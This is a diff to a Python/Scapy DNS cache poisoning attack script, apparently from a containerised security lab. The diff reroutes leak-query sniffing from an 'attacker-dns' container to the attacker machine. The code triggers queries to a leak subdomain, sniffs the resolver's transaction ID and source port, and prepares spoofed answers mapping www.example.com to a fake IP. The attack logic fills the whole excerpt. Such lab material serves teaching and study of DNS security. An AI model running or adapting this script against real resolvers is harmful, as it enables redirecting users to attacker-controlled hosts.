@@ -7,7 +7,6 @@ import random
 target_dns = "10.9.0.53"
 # Now spoofing example-dns (10.9.0.154) which root-dns delegates example.com to
 auth_dns = "10.9.0.154"
-attacker_dns = "10.9.0.155"
 leak_ns_ip = "10.9.0.10"
 domain = "www.example.com"
 fake_ip = "6.6.6.6" 
@@ -27,14 +26,14 @@ def sniff_port_and_txid(max_attempts=5):
                 and p.haslayer(DNS)
                 and p[DNS].qr == 0
                 and p[IP].src == target_dns
-                and p[IP].dst == attacker_dns
+                and p[IP].dst == leak_ns_ip
                 and p[UDP].dport == 53
             ),
         )
         sniffer.start()
         time.sleep(0.1)
 
-        # local-dns -> root-dns (.153) -> attacker-dns (.155) -> attacker machine (.10)
+        # local-dns -> root-dns (.153) -> attacker machine (.10)
         qname = "{}.leak.attacker.com".format(random.randint(0, 2**31 - 1))
         trigger_leak = (
             IP(dst=target_dns)
@@ -51,13 +50,12 @@ def sniff_port_and_txid(max_attempts=5):
             print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
             return leaked_txid, target_port
 
-    print("[-] Could not sniff local-dns -> attacker-dns traffic on eth0.")
+    print("[-] Could not sniff local-dns -> attacker-machine traffic on eth0.")
     print("[-] You are likely running this from the wrong container.")
-    print("[-] Run it on attacker-dns, because local-dns sends the leak query to 10.9.0.155.")
-    print("[-] Example: podman exec -it attacker-dns python3 /attacks/Cache_poisoning.py")
+    print("[-] Run it on the attacker machine, because leak.attacker.com is delegated there.")
+    print("[-] Example: podman exec -it attacker python3 /attacks/Cache_poisoning.py")
     exit(1)
 
-#leaked_txid, target_port = sniff_port_and_txid()
 leaked_txid, target_port = sniff_port_and_txid()
 
 print("[*] 3. Sending request to resolve www.example.com...")
